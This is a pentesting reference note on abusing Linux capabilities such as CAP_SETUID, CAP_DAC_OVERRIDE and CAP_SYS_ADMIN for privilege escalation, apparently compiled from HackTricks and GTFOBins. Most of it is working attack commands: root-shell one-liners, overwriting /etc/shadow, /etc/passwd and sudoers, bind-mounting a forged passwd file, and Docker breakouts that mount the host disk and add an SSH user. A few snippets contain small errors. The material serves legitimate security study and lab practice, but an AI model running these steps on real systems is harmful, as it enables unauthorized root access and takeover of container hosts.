---
id: Capabilities
aliases: []
tags:
  - Linux/Privesc/Capabilities
---

# Capabilities

Linux [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
Linux capabilities divide root privileges into smaller, distinct units,
allowing processes to have a subset of privileges.

This minimizes the risks by not granting full root privileges unnecessarily.

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)
> - [GTFOBins](https://gtfobins.github.io/#+capabilities)
>
<!-- }}} -->

___

<!-- Enumerate {{{-->
## Enumerate

Enumerate installed binaries with their set capabilities

```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```sh
getcap -r / 2>/dev/null
```

<!-- Info {{{-->
> [!info]-
>
> - `find`: Search for all binary executables at their usual location
> - `-exec`: Run [getcap](https://linux.die.net/man/8/getcap)
>   to show capabilities
>
> The output will show all binary executables,
> along with their set capabilities
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> MarciPwns@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
> ```
>
> ```sh
> /usr/bin/vim.basic cap_dac_override=eip
> /usr/bin/ping cap_net_raw=ep
> /usr/bin/mtr-packet cap_net_raw=ep
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Exploit {{{-->
## Exploit

<!-- CAP_CHOWN {{{-->
### CAP_CHOWN

[CAP_CHOWN](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to make arbitrary changes to file UIDs and GIDs -
Change the ownership of any file

1. Change the owner of [[Linux/General/Users & Groups#Shadow|Shadow]]

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]]
>
> ```bash
> python -c 'import os;os.chown("/etc/shadow",1000,1000)'
> ```
>
> [[Ruby/General|Ruby]]
>
> ```bash
> ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
> ```
<!-- }}} -->

2. [[Payloads/Files#File Overwrite|Change root password]]
   and escalate privileges

```sh
echo "root:hacked" | chpasswd
```

___
<!-- }}} -->

<!-- CAP_DAC_READ_SEARCH {{{-->
### CAP_DAC_READ_SEARCH

[CAP_DAC_READ_SEARCH](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows a process to bypass permissions for reading files
and for reading and executing directories

Read files via [GTFOBins](https://gtfobins.org/#/^file%20read$/)

<!-- Info {{{-->
> [!info]-
>
> Its primary use is for file searching or reading purposes.
>
> However, it also allows a process
> to use the `open_by_handle_at(2)` function,
> which can access any file,
> including those outside the process's mount namespace.
>
> The handle used in `open_by_handle_at(2)` is supposed to be
> a non-transparent identifier obtained through `name_to_handle_at(2)`,
> but it can include sensitive information like inode numbers
> that are vulnerable to tampering.
>
> The potential for exploitation of this capability,
> particularly in the context of Docker containers,
> was demonstrated by Sebastian Krahmer with the shocker exploit,
> as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> [[tar]] — [Read File](https://gtfobins.org/gtfobins/tar/#file-read)
>
> ```sh
> cd /etc
> ```
> ```sh
> tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
> ```
> ```sh
> cd /tmp
> ```
> ```sh
> tar -cxf shadow.tar.gz
> ```
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]] — [Read File](https://gtfobins.org/gtfobins/python/#file-read)
>
> 1. List `root`'s files
>
> ```python
> import os
> for r, d, f in os.walk('/root'):
>     for filename in f:
>         print(filename)
> ```
>
> 2. Read a file
>
> ```python
> print(open("/etc/shadow", "r").read())
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> [[Docker]] breakout
>
> 1. Check the enabled capabilities inside the docker container
>
> ```sh
> capsh --print
> ```
> ```sh
> Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
> Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
> Securebits: 00/0x0/1'b0
>  secure-noroot: no (unlocked)
>  secure-no-suid-fixup: no (unlocked)
>  secure-keep-caps: no (unlocked)
> uid=0(root)
> gid=0(root)
> groups=0(root)
> ```
>
> 2. The [[#CAP_DAC_READ_SEARCH]] capability is enabled,
>    so that the container can **debug processes**
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > [Exploit](https://codeberg.org/marcellbarsony/pentest-resources/src/branch/main/Exploits/Privesc/Linux/shocker)
> >
> > [Exploit source](http://stealth.openwall.net/xSports/shocker.c)
> >
> > [Exploit Analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
> >
> <!-- }}} -->
>
> [[#CAP_DAC_READ_SEARCH]]
> not only allows traversing the file system without permission checks,
> but also explicitly removes any checks to `open_by_handle_at(2)`
> and could allow our process to sensitive files opened by other processes
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > The exploit needs to find a pointer to something mounted on the host.
> > The original exploit used the file `/.dockerinit`
> > and this modified version uses `/etc/hostname`.
> >
> > If the exploit isn't working, set a different file.
> >
> > To find a file that is mounted in the host just execute `mount`
> >
> > ```sh
> > mount
> > ```
> >
> <!-- }}} -->
>
<!-- }}} -->

___
<!-- }}} -->

<!-- CAP_DAC_OVERRIDE {{{-->
### CAP_DAC_OVERRIDE

[CAP_DAC_OVERRIDE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to bypass write permission checks on any file

> [!tip]- Payloads
>
> [Payloads - Overwriting a file](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/payloads-to-execute.html#overwriting-a-file-to-escalate-privileges)

<!-- Example {{{-->
> [!example]-
>
> Use `vim` to modify any file
> (*e.g., `/etc/passwd`, `/etc/sudoers`, `shadow`*)
>
> 1. Enumerate capabilities
>
> ```sh
> getcap -r / 2>/dev/null
> ```
> ```sh
> /usr/bin/vim = cap_dac_override+ep
> ```
>
> 2. Write the file
>
> ```sh
> /usr/bin/vim /etc/passwd
> ```
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> **Non-interactive mode**
>
> Use `su` to log in as `root` without being asked for the password
>
> 1. Overwrite `/etc/passwd` to enable `root` login without password
>
> ```sh
> echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim -es /etc/passwd
> ```
>
> 2. Check `/etc/passwd`
>
> ```sh
> cat /etc/passwd | head -n1
> ```
> ```sh
> root::0:0:root:/root:/bin/bash
> ```
>
> 3. Log in as `root`
>
> ```sh
> su
> ```
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]] — [Write File](https://gtfobins.org/gtfobins/python/#file-write)
>
> ```python
> file=open("/etc/sudoers","a")
> file.write("<user> ALL=(ALL) NOPASSWD:ALL")
> file.close()
> ```
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> `CAP_DAC_READ_SEARCH` [[Docker]] breakout
>
> Check the enabled capabilities inside the Docker container
>
> ```sh
> capsh --print
> ```
> ```sh
> Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
> Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
> Securebits: 00/0x0/1'b0
>  secure-noroot: no (unlocked)
>  secure-no-suid-fixup: no (unlocked)
>  secure-keep-caps: no (unlocked)
> uid=0(root)
> gid=0(root)
> groups=0(root)
> ```
<!-- }}} -->

1. Read [[#CAP_DAC_READ_SEARCH]] on how to read arbitrary files
2. Compile the following version of the shocker exploit
   that will allows to write arbitrary files
   inside the host's filesystem

[[Exploits/shocker.c]]

To scape the Docker container

1. Download `/etc/shadow` and `/etc/passwd`
2. Add to them a new user
3. Use `shocker_write` to overwrite them
4. Then, access via [[SSH/General|SSH]]

___
<!-- }}} -->

<!-- CAP_FOWNER {{{-->
### CAP_FOWNER

[CAP_FOWNER](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to change the permission of any file

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]]
>
> ```bash
> python -c 'import os;os.chmod("/etc/shadow",0666)
> ```
>
> [[Ruby/General|Ruby]]
>
> ```sh
> ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- CAP_KILL {{{-->
### CAP_KILL

[CAP_KILL](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to kill any process

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]] - Kill arbitrary processes
>
> ```python
> import os
> import signal
> pgid = os.getpgid(341)
> os.killpg(pgid, signal.SIGKILL)
> ```
>
> If you could also modify some service or socket configuration file
> (or any configuration file related to a service),
> you could backdoor i
> and then kill the process related to that service
> and wait for the new configuration file to be executed with your backdoor.
>
<!-- }}} -->

**Privesc with kill**

If you have kill capabilities and there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

<!-- }}} -->

<!-- CAP_LINUX_IMMUTABLE {{{-->
### CAP_LINUX_IMMUTABLE

**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.

**Example with binary**

If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

<!-- Example {{{-->
> [!example]-
>
> ```python
> #Pyhton code to allow modifications to the file
> import fcntl
> import os
> import struct
>
> FS_APPEND_FL = 0x00000020
> FS_IOC_SETFLAGS = 0x40086602
>
> fd = os.open('/path/to/file.sh', os.O_RDONLY)
> f = struct.pack('i', FS_APPEND_FL)
> fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)
>
> f=open("/path/to/file.sh",'a+')
> f.write('New content for the file\n')
> ```
<!-- }}} -->

> [!tip]
>
> Note that usually this immutable attribute is set and remove using:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

<!-- }}} -->

<!-- CAP_MKNOD {{{-->
### CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) extends the functionality of the `mknod` system call beyond creating regular files, FIFOs (named pipes), or UNIX domain sockets. It specifically allows for the creation of special files, which include:

- **S_IFCHR**: Character special files, which are devices like terminals.
- **S_IFBLK**: Block special files, which are devices like disks.

This capability is essential for processes that require the ability to create device files, facilitating direct hardware interaction through character or block devices.

It is a default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:

1. Have initial access to the host (Unprivileged).
2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
3. Host and container should share the same user namespace.

**Steps to Create and Access a Block Device in a Container:**

1. **On the Host as a Standard User:**

   - Determine your current user ID with `id`, e.g., `uid=1000(standarduser)`.
   - Identify the target device, for example, `/dev/sdb`.

2. **Inside the Container as `root`:**

<!-- Example {{{-->
> [!example]-
>
> ```bash
> # Create a block special file for the host device
> mknod /dev/sdb b 8 16
> # Set read and write permissions for the user and group
> chmod 660 /dev/sdb
> # Add the corresponding standard user present on the host
> useradd -u 1000 standarduser
> # Switch to the newly created user
> su standarduser
> ```
<!-- }}} -->

3. **Back on the Host:**

<!-- Example {{{-->
> [!example]-
>
> ```bash
> # Locate the PID of the container process owned by "standarduser"
> # This is an illustrative example; actual command might vary
> ps aux | grep -i container_name | grep -i standarduser
> # Assuming the found PID is 12345
> # Access the container's filesystem and the special block device
> head /proc/12345/root/dev/sdb
> ```
<!-- }}} -->

This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container, exploiting shared user namespaces and permissions set on the device.

<!-- }}} -->

<!-- CAP_NET_ADMIN + CAP_NET_RAW {{{-->
### CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability grants the holder the power to **alter network configurations**, including firewall settings, routing tables, socket permissions, and network interface settings within the exposed network namespaces. It also enables turning on **promiscuous mode** on network interfaces, allowing for packet sniffing across namespaces.

**Example with binary**

Lets suppose that the **python binary** has these capabilities.

<!-- Example {{{-->
> [!example]-
>
> ```python
> #Dump iptables filter table rules
> import iptc
> import pprint
> json=iptc.easy.dump_table('filter',ipv6=False)
> pprint.pprint(json)
>
> #Flush iptables filter table
> import iptc
> iptc.easy.flush_table('filter')
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CAP_NET_BIND_SERVICE {{{-->
### CAP_NET_BIND_SERVICE

**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.

**Example with binary**

If **`python`** has this capability it will be able to listen on any port and even connect from it to any other port (some services require connections from specific privileges ports)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

<!-- }}} -->

<!-- CAP_NET_RAW {{{-->
### CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability permits processes to **create RAW and PACKET sockets**, enabling them to generate and send arbitrary network packets. This can lead to security risks in containerized environments, such as packet spoofing, traffic injection, and bypassing network access controls. Malicious actors could exploit this to interfere with container routing or compromise host network security, especially without adequate firewall protections. Additionally, **CAP_NET_RAW** is crucial for privileged containers to support operations like ping via RAW ICMP requests.

**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.

**Example with binary**

If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.

**Example with binary 2**

The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET_BIND + NET_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)

<!-- Example {{{-->
> [!example]-
>
> ```python
> import socket
> import struct
>
> flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]
>
> def getFlag(flag_value):
>     flag=""
>     for i in xrange(8,-1,-1):
>         if( flag_value & 1 <<i ):
>             flag= flag + flags[8-i] + ","
>     return flag[:-1]
>
> s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
> s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
> s.bind(("lo",0x0003))
>
> flag=""
> count=0
> while True:
>     frame=s.recv(4096)
>     ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
>     proto=ip_header[6]
>     ip_header_size = (ip_header[0] & 0b1111) * 4
>     if(proto==6):
>         protocol="TCP"
>         tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
>         tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
>         dst_port=tcp_header[0]
>         src_port=tcp_header[1]
>         flag=" FLAGS: "+getFlag(tcp_header[4])
>
>     elif(proto==17):
>         protocol="UDP"
>         udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
>         udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
>         dst_port=udp_header[0]
>         src_port=udp_header[1]
>
>     if (proto == 17 or proto == 6):
>         print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
>         count=count+1
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CAP_SETFCAP {{{-->
### CAP_SETFCAP

**This means that it's possible to set capabilities on files and processes**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

<!-- Example {{{-->
> [!example]-
>
> ```python:setcapability.py
> import ctypes, sys
>
> #Load needed library
> #You can find which library you need to load checking the libraries of local setcap binary
> # ldd /sbin/setcap
> libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
>
> libcap.cap_from_text.argtypes = [ctypes.c_char_p]
> libcap.cap_from_text.restype = ctypes.c_void_p
> libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]
>
> #Give setuid cap to the binary
> cap = 'cap_setuid+ep'
> path = sys.argv[1]
> print(path)
> cap_t = libcap.cap_from_text(cap)
> status = libcap.cap_set_file(path,cap_t)
>
> if(status == 0):
>     print (cap + " was successfully added to " + path)
> ```
<!-- }}} -->

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Note that if you set a new capability to the binary with CAP_SETFCAP, you will lose this cap.

Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to its section to see how to escalate privileges.

**Example with environment (Docker breakout)**

By default the capability **CAP_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something like:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> cat /proc/`pidof bash`/status | grep Cap
> CapInh: 00000000a80425fb
> CapPrm: 00000000a80425fb
> CapEff: 00000000a80425fb
> CapBnd: 00000000a80425fb
> CapAmb: 0000000000000000
>
> capsh --decode=00000000a80425fb
> 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
> ```
<!-- }}} -->

This capability allow to **give any other capability to binaries**, so we could think about **escaping** from the container **abusing any of the other capability breakouts** mentioned in this page.\
However, if you try to give for example the capabilities CAP_SYS_ADMIN and CAP_SYS_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> getcap /usr/bin/gdb
> /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
>
> setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
>
> /usr/bin/gdb
> bash: /usr/bin/gdb: Operation not permitted
> ```
<!-- }}} -->

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP_SETPCAP** capability in its effective set._\
It looks like the Permitted capabilities limit the ones that can be used.\
However, Docker also grants the **CAP_SETPCAP** by default, so you might be able to **set new capabilities inside the inheritables ones**.\
However, in the documentation of this cap: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
It looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot put new capabilities like CAP_SYS_ADMIN or CAP_SYS_PTRACE in the inherit set to escalate privileges**.

<!-- }}} -->

<!-- CAP_SETGID {{{-->
### CAP_SETGID

[CAP_SETGID](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to set the effective group id of the created process

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this case you should look for interesting files that a group can read because you can impersonate any group:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In this case the group shadow was impersonated so you can read the file `/etc/shadow`:

```bash
cat /etc/shadow
```

If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).

<!-- }}} -->

<!-- CAP_SETPCAP {{{-->
### CAP_SETPCAP

**CAP_SETPCAP** enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants' permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.

**`CAP_SETPCAP`** is a Linux capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there are certain restrictions on how this capability can be used.

A process with `CAP_SETPCAP` **can only grant or remove capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another process if it does not have that capability itself. This restriction prevents a process from elevating the privileges of another process beyond its own level of privilege.

Moreover, in recent kernel versions, the `CAP_SETPCAP` capability has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes. Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.

To use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.

In summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its descendants.

<!-- }}} -->

<!-- CAP_SETUID {{{-->
### CAP_SETUID

[CAP_SETUID](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to set effective `UID` of the created process

[[PHP/General|PHP]]

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which php) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep php
> ```
>
> ```sh
> CMD="/bin/sh"
> ```
>
> ```sh
> ./php -r "posix_setuid(0); system('$CMD');"
> ```
<!-- }}} -->

[[Python/General|Python]]

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which python) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep python
> ```
>
> ```sh
> ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Create a script that modifies the process user identifier (`UID`)
>
> ```sh
> touch privesc.py
> ```
>
> ```sh
> echo 'import os; os.setuid(0); os.system("/bin/sh")' > privesc.py
> ```
>
> ```sh
> chmod +x privesc.py
> ```
>
> ```sh
> ./privesc.py
> ```
<!-- }}} -->

[[Ruby/General|Ruby]]

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which ruby) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep ruby
> ```
>
> ```sh
> ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which vim) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep vim
> ```
>
> This requires that vim is compiled with Python support.
> Prepend `:py3` for Python 3.
>
> ```sh
> ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- CAP_SYSLOG {{{-->
### CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) was separated from the broader **CAP_SYS_ADMIN** in Linux 2.6.37, specifically granting the ability to use the `syslog(2)` call. This capability enables the viewing of kernel addresses via `/proc` and similar interfaces when the `kptr_restrict` setting is at 1, which controls the exposure of kernel addresses. Since Linux 2.6.39, the default for `kptr_restrict` is 0, meaning kernel addresses are exposed, though many distributions set this to 1 (hide addresses except from uid 0) or 2 (always hide addresses) for security reasons.

Additionally, **CAP_SYSLOG** allows accessing `dmesg` output when `dmesg_restrict` is set to 1. Despite these changes, **CAP_SYS_ADMIN** retains the ability to perform `syslog` operations due to historical precedents.

<!-- }}} -->

<!-- CAP_SYS_ADMIN {{{-->
### CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is a highly potent Linux capability, often equated to a near-root level due to its extensive **administrative privileges**, such as mounting devices or manipulating kernel features. While indispensable for containers simulating entire systems, **`CAP_SYS_ADMIN` poses significant security challenges**, especially in containerized environments, due to its potential for privilege escalation and system compromise. Therefore, its usage warrants stringent security assessments and cautious management, with a strong preference for dropping this capability in application-specific containers to adhere to the **principle of least privilege** and minimize the attack surface.

**Example with binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> cp /etc/passwd ./ #Create a copy of the passwd file
> openssl passwd -1 -salt abc password #Get hash of "password"
> vim ./passwd #Change roots passwords of the fake passwd file
> ```
<!-- }}} -->

And finally **mount** the modified `passwd` file on `/etc/passwd`:

<!-- Example {{{-->
> [!example]-
>
> ```python
> from ctypes import *
> libc = CDLL("libc.so.6")
> libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
> MS_BIND = 4096
> source = b"/path/to/fake/passwd"
> target = b"/etc/passwd"
> filesystemtype = b"none"
> options = b"rw"
> mountflags = MS_BIND
> libc.mount(source, target, filesystemtype, mountflags, options)
> ```
<!-- }}} -->

And you will be able to **`su` as root** using password "password".

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

<!-- Example {{{-->
> [!example]-
>
> ```
> capsh --print
> Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
> Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
> Securebits: 00/0x0/1'b0
>  secure-noroot: no (unlocked)
>  secure-no-suid-fixup: no (unlocked)
>  secure-keep-caps: no (unlocked)
> uid=0(root)
> gid=0(root)
> groups=0(root)
> ```
<!-- }}} -->

Inside the previous output you can see that the SYS_ADMIN capability is enabled.

- **Mount**

This allows the docker container to **mount the host disk and access it freely**:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> fdisk -l #Get disk name
> Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
> Units: sectors of 1 * 512 = 512 bytes
> Sector size (logical/physical): 512 bytes / 512 bytes
> I/O size (minimum/optimal): 512 bytes / 512 bytes
>
> mount /dev/sda /mnt/ #Mount it
> cd /mnt
> chroot ./ bash #You have a shell inside the docker hosts disk
> ```
<!-- }}} -->

- **Full access**

In the previous method we managed to access the docker host disk.\
In case you find that the host is running an **ssh** server, you could **create a user inside the docker host** disk and access it via SSH:

```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```

<!-- }}} -->

<!-- CAP_SYS_BOOT {{{-->
### CAP_SYS_BOOT

